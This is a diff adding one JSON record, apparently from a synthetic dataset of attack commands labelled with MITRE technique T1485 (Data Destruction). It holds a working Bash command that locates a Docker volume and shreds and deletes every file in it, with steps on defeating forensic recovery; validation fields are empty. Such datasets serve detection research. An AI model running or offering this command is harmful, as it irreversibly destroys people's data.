@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "find \"$(docker volume inspect -f '{{.Mountpoint}}' app_data)\" -xdev -type f -exec shred -n 2 -z -u -f {} +",
+  "explanation": "Locates the mount point of the Docker volume 'app_data' and irreversibly destroys files within it.",
+  "rationale_steps": [
+    "Leverage Docker to resolve the exact volume mount path for targeted destruction.",
+    "Overwrite data within the volume to prevent forensic recovery of container data.",
+    "Delete files after shredding to purge directory entries inside the volume."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-097d0d83-6d4af726",
+  "source_prompt_hash": "097d0d83",
+  "timestamp_utc": "2025-09-30T07:53:07.976516Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
